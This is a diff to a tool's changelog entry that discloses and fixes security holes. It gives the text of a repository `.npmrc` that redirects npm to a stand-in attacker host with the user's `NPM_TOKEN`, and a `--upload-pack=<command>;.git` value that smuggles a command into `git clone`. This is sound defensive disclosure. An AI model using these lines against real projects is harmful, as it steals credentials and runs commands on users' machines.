@@ -511,6 +511,23 @@ version bump.
   `GOCACHE`, …) — with any credential-looking name, `GUARDIAN_*` and `npm_config_*` removed, in the worktree and
   the base-commit tree alike. The tool description said a dry run "never leaves the machine"; it now says that a
   dry run executes the project's test command, which is the project's code.
+- **A repository's `.npmrc` sent `create_fix_pr`'s npm requests, and the user's token, to a host it chose.**
+  `registry=http://<attacker>/` plus `//<attacker>/:_authToken=${NPM_TOKEN}` in a repository made the planning
+  tree's `npm outdated` — and the fix's `npm ci` / `npm install` and the re-scan's `npm audit` — fetch from that
+  host with the user's own `NPM_TOKEN` (measured with a local registry that records `Authorization`, and the same
+  with `@acme:registry=`). `--ignore-scripts` does not stop a fetch. In every checkout it works in, `create_fix_pr`
+  now moves the repository's `.npmrc`, `.pnpmrc`, `.yarnrc`, `.yarnrc.yml`, `pip.conf`, `pip.ini`, `.pip/`,
+  `.cargo/config.toml` / `.cargo/config`, `.bundle/config` and `NuGet.config` out before any package manager runs
+  (from the project up to the checkout's root), names them in the group's new `package_config_set_aside`, and puts
+  them back before committing. Every package-manager process it runs — `npm`, `pip-audit`, `composer`, `bundle`,
+  `cargo`, `go`, `dotnet restore`, directly or through `deps_update_plan` and `deps_audit` — gets the test
+  command's allowlisted environment plus the user's own package-manager configuration (the `NPM_CONFIG_*`,
+  `PIP_*`, `CARGO_REGISTRIES_*`, `GOPROXY`-family, … and proxy variables, and the variables `~/.npmrc`, `~/.yarnrc`
+  and `~/.yarnrc.yml` reference as `${VAR}`): the user's token still reaches the user's registry, and only it. A
+  fix whose requirements, or a file they include with `-r` / `-c`, choose a pip index (`-i`, `--index-url`,
+  `--extra-index-url`, `--find-links`, `--trusted-host`) is refused when pip would install from them (a pip step,
+  or a re-scan by `deps_audit`), with the new outcome `refused`; so is a Composer fix whose `composer.json`
+  declares `repositories`, which is not planned either.
 - `scan_skill` no longer hands its target to `git clone` as a possible option. A target is cloned when it merely
   ends in `.git`, so `--upload-pack=<command>;.git` reached git as `--upload-pack`, the temporary directory after it
   became the repository, and git ran the command to fetch from it. The URL now follows `--`.
